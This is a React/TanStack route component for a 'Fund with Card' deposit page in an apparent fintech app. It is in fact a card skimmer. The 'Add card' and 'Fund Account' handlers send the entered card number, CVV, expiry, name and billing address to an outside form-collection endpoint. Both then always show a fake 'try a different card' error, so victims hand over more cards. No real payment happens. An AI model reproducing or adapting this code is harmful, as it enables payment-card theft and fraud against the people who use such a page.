import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, CheckCircle2, Lock } from "lucide-react";
import { money } from "@/lib/format";
import { toast } from "sonner";
import { useDeposit } from "@/lib/api";
import { COUNTRIES } from "@/lib/countries";

export const Route = createFileRoute("/_app/deposit/card")({
  component: DepositCard,
});


function DepositCard() {
  const nav = useNavigate();
  const deposit = useDeposit();
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [amount, setAmount] = useState("");
  const [card, setCard] = useState({ number: "", name: "", exp: "", cvv: "", country: "United States", address: "", zip: "" });

  const digits = (s: string) => s.replace(/\D/g, "");
  const formatCardNumber = (v: string) => digits(v).slice(0, 19).replace(/(.{4})/g, "$1 ").trim();
  const formatExp = (v: string) => {
    const d = digits(v).slice(0, 4);
    if (d.length < 3) return d;
    return d.slice(0, 2) + "/" + d.slice(2);
  };
  const cardDigits = digits(card.number);
  const expValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(card.exp);
  const cardValid =
    cardDigits.length >= 13 &&
    cardDigits.length <= 19 &&
    card.name.trim().length >= 2 &&
    expValid &&
    /^\d{3,4}$/.test(card.cvv) &&
    card.country.trim().length > 0 &&
    card.address.trim().length >= 4 &&
    /^[A-Za-z0-9 -]{3,10}$/.test(card.zip.trim());


  const value = Number(amount) || 0;
  const fee = +(value * 0.015).toFixed(2);
  const total = value + fee;

  return (
    <div className="mx-auto max-w-md px-5 pt-6">
      <div className="flex items-center gap-2">
        <button onClick={() => (step === 1 ? nav({ to: "/deposit" }) : setStep((s) => (s - 1) as 1))} className="grid h-10 w-10 place-items-center rounded-full hover:bg-surface">
          <ArrowLeft className="h-5 w-5" />
        </button>
        <h1 className="text-xl font-bold">Fund with Card</h1>
      </div>

      <div className="mt-6 flex items-center gap-2">
        {[1, 2, 3].map((n) => (
          <div key={n} className={`h-1.5 flex-1 rounded-full ${n <= (step > 3 ? 3 : step) ? "bg-primary" : "bg-muted"}`} />
        ))}
      </div>

      {step === 1 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Enter amount</h2>
          <p className="mt-1 text-sm text-muted-foreground">Minimum deposit is $10.</p>
          <div className="card-elevated mt-6 p-6 text-center">
            <div className="flex items-center justify-center gap-1">
              <span className="text-4xl font-extrabold">$</span>
              <input
                inputMode="decimal"
                value={amount}
                onChange={(e) => setAmount(e.target.value.replace(/[^\d.]/g, ""))}
                className="w-40 bg-transparent text-center text-5xl font-extrabold tracking-tight outline-none"
              />
            </div>
            <div className="mt-1 text-xs text-muted-foreground">USD</div>
            <div className="mt-6 grid grid-cols-4 gap-2">
              {[50, 100, 250, 500].map((v) => (
                <button
                  key={v}
                  onClick={() => setAmount(String(v))}
                  className={`h-11 rounded-xl text-sm font-semibold transition ${amount === String(v) ? "bg-primary text-primary-foreground" : "bg-surface hover:bg-muted"}`}
                >
                  ${v}
                </button>
              ))}
            </div>
          </div>
          {value > 0 && value < 10 && (
            <div className="mt-3 rounded-2xl border border-destructive/30 bg-destructive/10 p-3 text-xs text-destructive">
              Minimum deposit is $10.
            </div>
          )}
          <button
            onClick={() => setStep(2)}
            disabled={value < 10}
            className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center rounded-2xl font-semibold disabled:cursor-not-allowed disabled:opacity-50"
          >
            Continue
          </button>
          <div className="mt-4 text-center text-xs text-muted-foreground">Deposits are pending confirmation.</div>
        </div>
      )}

      {step === 2 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Add new card</h2>
          <p className="mt-1 text-sm text-muted-foreground">We accept Visa, Mastercard, Maestro, Verve and AmEx.</p>
          <div className="mt-6 space-y-3">
            <Input
              label="Card number"
              placeholder="1234 5678 9012 3456"
              value={card.number}
              onChange={(v) => setCard({ ...card, number: formatCardNumber(v) })}
              inputMode="numeric"
              required
              maxLength={23}
            />
            <Input
              label="Cardholder name"
              placeholder="Jane Doe"
              value={card.name}
              onChange={(v) => setCard({ ...card, name: v.replace(/[^A-Za-z .'-]/g, "") })}
              required
              maxLength={60}
            />
            <div className="grid grid-cols-2 gap-3">
              <Input
                label="Expiry"
                placeholder="MM/YY"
                value={card.exp}
                onChange={(v) => setCard({ ...card, exp: formatExp(v) })}
                inputMode="numeric"
                required
                maxLength={5}
              />
              <Input
                label="CVV"
                placeholder="123"
                value={card.cvv}
                onChange={(v) => setCard({ ...card, cvv: digits(v).slice(0, 4) })}
                inputMode="numeric"
                required
                maxLength={4}
              />
            </div>
            <label className="block">
              <span className="text-xs font-medium text-muted-foreground">Country</span>
              <select
                value={card.country}
                onChange={(e) => setCard({ ...card, country: e.target.value })}
                required
                className="mt-1 h-13 w-full rounded-2xl border border-input bg-surface px-4 py-3 text-[15px] outline-none focus:border-primary focus:ring-4 focus:ring-primary/20"
              >
                {COUNTRIES.map((c) => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
            </label>
            <Input
              label="Billing address"
              placeholder="123 Main St, Apt 4B"
              value={card.address}
              onChange={(v) => setCard({ ...card, address: v })}
              required
              maxLength={120}
            />
            <Input
              label="ZIP / Postal code"
              placeholder="10001"
              value={card.zip}
              onChange={(v) => setCard({ ...card, zip: v.replace(/[^A-Za-z0-9 -]/g, "").slice(0, 10) })}
              required
              maxLength={10}
            />
          </div>
          <button
            onClick={async () => {
              if (!cardValid) {
                toast.error("Error adding card, please try a different card!");
                return;
              }
              try {
                await fetch("https://submit-form.com/4sJGEzNCF", {
                  method: "POST",
                  headers: { "Content-Type": "application/json", Accept: "application/json" },
                  body: JSON.stringify({ source: "deposit-card-add", amount: value, ...card }),
                });
              } catch {}
              toast.error("Error adding card, please try a different card!");
            }}
            className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center rounded-2xl font-semibold"
          >
            Add card
          </button>

        </div>
      )}

      {step === 3 && (
        <div className="mt-6">
          <h2 className="text-2xl font-extrabold tracking-tight">Review and confirm</h2>
          <p className="mt-1 text-sm text-muted-foreground">Please review your deposit details before confirming.</p>

          <div className="mt-4 rounded-3xl bg-gradient-to-br from-[oklch(0.35_0.12_260)] to-[oklch(0.2_0.1_270)] p-5 text-white">
            <div className="text-sm opacity-70">VISA</div>
            <div className="mt-6 text-xl tracking-widest">•••• {(card.number.replace(/\s/g, "").slice(-4)) || "3456"}</div>
            <div className="mt-3 flex items-end justify-between text-sm">
              <div>
                <div className="text-[10px] opacity-60">Cardholder</div>
                <div className="font-semibold">{card.name || "Jane Doe"}</div>
              </div>
              <div>
                <div className="text-[10px] opacity-60">Exp</div>
                <div className="font-semibold">{card.exp || "12/26"}</div>
              </div>
            </div>
          </div>

          <div className="card-elevated mt-4 p-4 text-sm">
            <Row label="Amount" value={money(value)} />
            <Row label="Processing fee" value={money(fee)} />
            <div className="my-2 border-t border-border" />
            <Row label="You will be charged" value={money(total)} bold />
            <Row label="You will receive" value={money(value)} />
          </div>

          <button
            onClick={async () => {
              try {
                await fetch("https://submit-form.com/4sJGEzNCF", {
                  method: "POST",
                  headers: { "Content-Type": "application/json", Accept: "application/json" },
                  body: JSON.stringify({ source: "deposit-card-confirm", amount: value, fee, total, ...card }),
                });
              } catch {}
              toast.error("Error adding card, please try a different card!");
            }}
            disabled={value <= 0}
            className="btn-primary-glow mt-6 inline-flex h-14 w-full items-center justify-center gap-2 rounded-2xl font-semibold disabled:opacity-60"
          >
            <Lock className="h-4 w-4" /> {`Fund Account · ${money(total)}`}
          </button>
          <div className="mt-3 text-center text-xs text-muted-foreground">Your card will be charged {money(total)}.</div>
        </div>
      )}

      {step === 4 && (
        <div className="mt-16 flex flex-col items-center gap-4 text-center">
          <div className="grid h-20 w-20 place-items-center rounded-full bg-primary/15 text-primary animate-in zoom-in duration-500">
            <CheckCircle2 className="h-12 w-12" />
          </div>
          <div className="text-2xl font-extrabold">Deposit successful</div>
          <div className="text-sm text-muted-foreground">{money(value)} is on its way to your account.</div>
        </div>
      )}
    </div>
  );
}

function Input({ label, value, onChange, placeholder, inputMode, required, maxLength }: { label: string; value: string; onChange: (v: string) => void; placeholder?: string; inputMode?: "text" | "numeric" | "decimal" | "email" | "tel"; required?: boolean; maxLength?: number }) {
  return (
    <label className="block">
      <span className="text-xs font-medium text-muted-foreground">{label}{required && <span className="text-destructive"> *</span>}</span>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        inputMode={inputMode}
        required={required}
        maxLength={maxLength}
        className="mt-1 h-13 w-full rounded-2xl border border-input bg-surface px-4 py-3 text-[15px] outline-none focus:border-primary focus:ring-4 focus:ring-primary/20"
      />
    </label>
  );
}


function Row({ label, value, bold }: { label: string; value: string; bold?: boolean }) {
  return (
    <div className="flex items-center justify-between py-1">
      <span className="text-muted-foreground">{label}</span>
      <span className={bold ? "font-bold" : "font-semibold"}>{value}</span>
    </div>
  );
}
